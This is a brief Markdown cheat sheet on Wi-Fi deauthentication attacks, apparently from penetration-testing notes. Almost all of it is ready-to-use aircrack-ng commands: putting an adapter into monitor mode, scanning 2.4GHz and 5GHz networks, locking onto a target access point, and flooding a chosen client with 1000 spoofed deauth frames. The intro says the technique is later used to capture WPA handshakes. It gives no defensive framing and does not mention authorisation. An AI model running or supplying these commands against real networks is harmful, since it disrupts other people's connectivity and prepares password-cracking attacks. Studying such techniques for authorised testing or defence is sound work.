# Deauthentication (Deauth)

Deauthentication is a wireless attack that forcibly disconnects a client from an access point by spoofing management frames. It's the foundational technique behind other wireless attacks — used here on its own to disrupt connectivity, and later to force a client to reconnect (capturing a WPA handshake or re-authenticating for WEP).

## Monitor Mode

| Command | Description |
|---|---|
| `airmon-ng start wlan0` | Puts the wireless adapter into monitor mode, required for all wireless attacks below |

## Scanning Networks

| Command | Description |
|---|---|
| `airodump-ng wlan0mon` | Scans 2.4GHz networks |
| `airodump-ng --band a wlan0mon` | Scans 5GHz networks |
| `airodump-ng --band abg wlan0mon` | Scans both 2.4GHz and 5GHz |

## Targeting

| Command | Description |
|---|---|
| `airodump-ng --channel [channel no] --bssid [BSSID] wlan0mon` | Locks onto a specific target (2.4GHz) |
| `airodump-ng --band a --channel [channel no] --bssid [BSSID] wlan0mon` | Locks onto a specific target (5GHz) |

## Attack

| Command | Description |
|---|---|
| `aireplay-ng --deauth 1000 -a [BSSID] -c [STATION] wlan0mon` | Sends deauth frames to disconnect the target client (2.4GHz) |
| `iwconfig wlan0mon channel [channel no]` | Locks the adapter to the correct channel — required for 5GHz |
| `aireplay-ng --deauth 1000 -D -a [BSSID] -c [STATION] wlan0mon` | Sends deauth frames on 5GHz |
